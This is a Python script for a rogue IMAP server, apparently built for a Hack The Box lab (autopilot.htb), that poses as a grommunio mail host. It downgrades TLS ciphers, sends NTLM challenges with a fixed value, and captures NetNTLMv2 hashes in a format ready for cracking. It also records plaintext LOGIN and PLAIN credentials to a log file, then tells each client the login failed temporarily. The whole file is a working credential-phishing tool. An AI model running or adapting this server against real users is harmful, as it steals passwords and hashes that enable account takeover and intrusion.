#!/usr/bin/env python3
import socket, ssl, threading, base64, struct, datetime

CERT = "/etc/grommunio-common/ssl/server-bundle.pem"
KEY  = "/etc/grommunio-common/ssl/server.key"
CHAL = b"\x11\x22\x33\x44\x55\x66\x77\x88"
CAPS = ("IMAP4rev1 XLIST SPECIAL-USE UNSELECT UIDPLUS IDLE LITERAL+ ENABLE MOVE "
        "ESEARCH SEARCHRES LIST-EXTENDED LIST-STATUS STATUS=SIZE NAMESPACE "
        "IMAP4rev2 STARTTLS AUTH=NTLM AUTH=LOGIN AUTH=PLAIN")

def log(m):
    line = "[%s] %s" % (datetime.datetime.now().strftime("%H:%M:%S"), m)
    print(line, flush=True)
    open("/tmp/imapcreds.log", "a").write(line + "\n")

def rline(s):
    buf = b""
    while not buf.endswith(b"\n"):
        d = s.recv(1)
        if not d:
            break
        buf += d
    return buf

def build_type2(cflags, domain="AUTOPILOT", server="GROMMUNIO"):
    def av(t, v):
        return struct.pack("<HH", t, len(v)) + v
    tgt = domain.encode("utf-16-le")
    ti = (av(2, domain.encode("utf-16-le")) +
          av(1, server.encode("utf-16-le")) +
          av(4, "autopilot.htb".encode("utf-16-le")) +
          av(3, "grommunio.autopilot.htb".encode("utf-16-le")) +
          av(0, b""))
    off_tgt = 56
    off_ti = off_tgt + len(tgt)
    m = b"NTLMSSP\x00" + struct.pack("<I", 2)
    m += struct.pack("<HHI", len(tgt), len(tgt), off_tgt)
    # echo back only what the client offered, plus REQUEST_TARGET and TARGET_TYPE_DOMAIN.
    # never add KEY_EXCH/SEAL/OEM the client did not negotiate, strict clients abort on it
    flags = (cflags & ~0x40000000) | 0x00000004 | 0x00010000 | 0x00080000 | 0x00800000
    m += struct.pack("<I", flags)
    m += CHAL + b"\x00" * 8
    m += struct.pack("<HHI", len(ti), len(ti), off_ti)
    m += b"\x06\x01\xb1\x1d\x00\x00\x00\x0f"
    return m + tgt + ti

def parse_type3(b):
    def sb(o):
        l, _, off = struct.unpack("<HHI", b[o:o + 8])
        return b[off:off + l]
    nt = sb(20)
    dom = sb(28).decode("utf-16-le", "replace")
    usr = sb(36).decode("utf-16-le", "replace")
    wks = sb(44).decode("utf-16-le", "replace")
    return usr, dom, wks, nt[:16].hex(), nt[16:].hex()

def handle(c, addr):
    tls = False
    try:
        c.settimeout(30)
        c.sendall(("* OK [CAPABILITY %s] Service ready\r\n" % CAPS).encode())
        while True:
            raw = rline(c)
            if not raw:
                break
            s = raw.decode("utf-8", "replace").strip()
            p = s.split(" ")
            tag = p[0]
            cmd = p[1].upper() if len(p) > 1 else ""
            log("%s %s >> %s" % (addr[0], "TLS" if tls else "PLAIN", s))

            if cmd == "STARTTLS" and not tls:
                c.sendall(("%s OK begin TLS negotiation now\r\n" % tag).encode())
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                ctx.load_cert_chain(CERT, KEY)
                try:
                    ctx.set_ciphers("DEFAULT:@SECLEVEL=0")
                except Exception:
                    pass
                c = ctx.wrap_socket(c, server_side=True)
                tls = True
                continue

            if cmd == "CAPABILITY":
                c.sendall(("* CAPABILITY %s\r\n%s OK CAPABILITY done\r\n" % (CAPS, tag)).encode())
                continue

            if cmd == "AUTHENTICATE":
                mech = p[2].upper() if len(p) > 2 else ""
                if mech == "NTLM":
                    c.sendall(b"+ \r\n")
                    t1 = rline(c).strip()
                    log("type1: %s" % t1.decode())
                    raw1 = base64.b64decode(t1)
                    cflags = struct.unpack("<I", raw1[12:16])[0]
                    log("client flags: 0x%08x" % cflags)
                    t2 = build_type2(cflags)
                    log("type2 sent: %s" % base64.b64encode(t2).decode())
                    c.sendall(b"+ " + base64.b64encode(t2) + b"\r\n")
                    t3 = rline(c).strip()
                    log("type3: %s" % t3.decode())
                    u, d, w, proof, blob = parse_type3(base64.b64decode(t3))
                    log("*** user=%s domain=%s workstation=%s" % (u, d, w))
                    log("*** NETNTLMv2 >>> %s::%s:%s:%s:%s" % (u, d, CHAL.hex(), proof, blob))
                elif mech == "LOGIN":
                    c.sendall(b"+ " + base64.b64encode(b"Username:") + b"\r\n")
                    u = base64.b64decode(rline(c).strip()).decode("utf-8", "replace")
                    c.sendall(b"+ " + base64.b64encode(b"Password:") + b"\r\n")
                    pw = base64.b64decode(rline(c).strip()).decode("utf-8", "replace")
                    log("*** CREDS user=%s pass=%s" % (u, pw))
                elif mech == "PLAIN":
                    c.sendall(b"+ \r\n")
                    log("*** CREDS %s" % base64.b64decode(rline(c).strip()).split(b"\x00"))
                c.sendall(("%s NO temporary failure, retry later\r\n" % tag).encode())
                continue

            if cmd == "LOGOUT":
                c.sendall(("* BYE\r\n%s OK LOGOUT done\r\n" % tag).encode())
                break

            c.sendall(("%s BAD unsupported\r\n" % tag).encode())
    except Exception as e:
        log("%s err: %r" % (addr[0], e))
    finally:
        try:
            c.close()
        except Exception:
            pass

srv = socket.socket()
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("0.0.0.0", 143))
srv.listen(16)
log("listening on 143")
while True:
    conn, a = srv.accept()
    threading.Thread(target=handle, args=(conn, a), daemon=True).start()
